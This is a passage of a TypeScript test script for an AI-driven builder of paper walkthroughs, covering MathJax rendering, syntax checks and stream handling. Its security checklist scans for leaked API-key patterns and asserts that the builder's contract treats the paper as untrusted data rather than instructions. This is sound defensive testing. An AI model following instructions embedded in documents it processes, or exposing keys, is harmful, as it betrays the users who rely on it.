    'vendored assets revalidate, so a dependency swap reaches browsers that already loaded one'
  );

  ok(
    !/enableAssistiveMml/.test(HELPER_JS),
    'the helper does not pass MathJax options that its pinned version rejects'
  );
  ok(
    /paths:\s*\{\s*mathjax:\s*'\/api\/walkthrough\/asset/.test(HELPER_JS),
    'the helper points MathJax\'s loader at our own origin, never a CDN'
  );

  // fontCache 'global' keeps every glyph path in one body-level <svg> and gives
  // each equation only <use> references into it. That element sits outside every
  // scroll container the page owns, so when it painted, giant glyphs landed on
  // top of the content and nothing clipped them. 'local' inlines each equation's
  // <defs> into its own <svg>: self-contained, nothing shared to go wrong.
  ok(
    /fontCache:\s*'local'/.test(HELPER_JS),
    "MathJax uses fontCache 'local' — 'global' paints a body-level glyph cache no container clips"
  );
  ok(
    !/fontCache:\s*'global'/.test(HELPER_JS),
    "MathJax does not use fontCache 'global'"
  );
  ok(
    /#MJX-SVG-global-cache\s*\{[^}]*display:\s*none/.test(HELPER_CSS),
    'the shared glyph cache is hard-hidden even if it is somehow created'
  );

  // MathJax sizes its SVG from measured font metrics (`nodeSize` reads
  // offsetWidth/offsetHeight). Inside a zero-size subtree — an iframe in a
  // `display: none` pane — those measure 0, the derived `ex` collapses, and
  // equations come out with enormous `ex` widths whose glyphs sprawl across the
  // page. Typesetting must therefore wait for a real layout box.
  ok(
    /function whenSized\(\)/.test(HELPER_JS),
    'the helper waits for a real layout box before typesetting'
  );
  ok(
    /clientWidth > 0/.test(HELPER_JS) && /ResizeObserver/.test(HELPER_JS),
    'that wait is driven by an actual size check, not a fixed delay'
  );
  ok(
    HELPER_JS.indexOf('whenSized()') < HELPER_JS.indexOf('typesetPromise'),
    'the size gate runs before typesetting, not after'
  );

  // Security checklist: no API key or app data reaches the scratch dir. The
  // build subprocess runs with bypassPermissions, so anything written here is
  // readable by generated code.
  const seeded = fs
    .readdirSync(scratch, { recursive: true } as any)
    .map(f => path.join(scratch, String(f)))
    .filter(f => fs.statSync(f).isFile())
    .map(f => fs.readFileSync(f, 'utf8'))
    .join('\n');
  ok(
    !/sk-ant-/.test(seeded) && !/claudeApiKey/.test(seeded) && !/ANTHROPIC_API_KEY/.test(seeded),
    'nothing resembling an API key is written into the build scratch directory'
  );
  ok(
    !/papers\.db|SUITE_DATA_ROOT/.test(seeded),
    'no app data path is written into the build scratch directory'
  );
  ok(
    /no network at runtime/i.test(CONTRACT_MD) && /connect-src/.test(CONTRACT_MD),
    'the contract states the no-network rule the scanner enforces'
  );
  ok(
    /untrusted/i.test(CONTRACT_MD) && /never as\s+instructions/i.test(CONTRACT_MD),
    'the contract tells the builder the paper is data, not instructions'
  );
  ok(
    !/node smoke\.mjs/.test(CONTRACT_MD),
    'the contract does not ask the builder to run a command it has no shell for'
  );

  // The syntax check that moved server-side when Bash was taken away.
  const goodBundle =
    '<html><body><script>WT.scenes(document.body, []); WT.ready();</script>' +
    'x'.repeat(600) + '</body></html>';
  ok(checkScriptSyntax(goodBundle).length === 0, 'valid inline scripts pass the syntax check');
  ok(
    checkScriptSyntax('<html><body><script>function ( { broken</script></body></html>').some(p =>
      /syntax error/i.test(p)
    ),
    'a syntax error in generated code is caught server-side, where it cannot be skipped'
  );
  ok(
    checkScriptSyntax('<html><body><script type="module">import x from "./y.js"; const</script></body></html>')
      .some(p => /syntax error/i.test(p)),
    'module scripts are checked as modules'
  );
  ok(
    checkScriptSyntax('<html><body><script src="/api/walkthrough/asset/three.module.js"></script>' +
      '<script>WT.ready();</script></body></html>').length === 0,
    'a src= script is skipped rather than parsed as inline code'
  );

  // ---------------------------------------------------------------- Phase 9
  console.log('Phase 9 — build progress interpretation\n');

  ok(
    interpretStreamLine('not json').length === 0,
    'a partial or non-JSON line is ignored rather than crashing the stream'
  );
  ok(
    interpretStreamLine(JSON.stringify({ type: 'system', subtype: 'init' }))[0]?.type === 'stage',
    'the init event becomes a stage update'
  );
  const delta = interpretStreamLine(
    JSON.stringify({
      type: 'stream_event',
      event: { type: 'content_block_delta', delta: { type: 'text_delta', text: 'hi' } },
    })
  );
  ok(delta[0]?.type === 'delta' && (delta[0] as any).text === 'hi', 'text deltas stream through');
  ok(
    interpretStreamLine(
      JSON.stringify({
        type: 'stream_event',
        event: { type: 'content_block_delta', delta: { type: 'thinking_delta', thinking: 'secret' } },
      })
    ).length === 0,
    'thinking deltas are not streamed to the client'
  );
  const tool = interpretStreamLine(
    JSON.stringify({
      type: 'assistant',
      message: { content: [{ type: 'tool_use', name: 'Write', input: { file_path: 'bundle.html' } }] },
    })
  );
  ok(
    tool[0]?.type === 'tool' && (tool[0] as any).name === 'Write',
    'tool calls surface as progress so a minutes-long spend is legible'
  );

  // A refused Write and a slow Write look identical unless the *result* is
  // forwarded too — that ambiguity is what makes "is it stuck?" unanswerable.
  const denied = interpretStreamLine(
    JSON.stringify({
      type: 'user',
      message: {
        content: [
          { type: 'tool_result', is_error: true, content: 'Permission to write bundle.html was denied' },
        ],
      },
    })
  );
  ok(
    denied[0]?.type === 'tool_result' && (denied[0] as any).ok === false,
    'a failed tool result (e.g. a permission refusal) reaches the progress stream'
  );
  ok(
    /denied/i.test(String((denied[0] as any)?.detail ?? '')),
    'the refusal text is carried through, not just a flag'
  );
  const succeeded = interpretStreamLine(
    JSON.stringify({
      type: 'user',
      message: { content: [{ type: 'tool_result', content: 'File written successfully' }] },
    })
  );
  ok(
    succeeded[0]?.type === 'tool_result' && (succeeded[0] as any).ok === true,
    'a successful tool result is distinguishable from a failed one'
  );

  try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}

  console.log(`\n${passed} passed, ${failed} failed`);
  if (failed > 0) process.exit(1);
})();
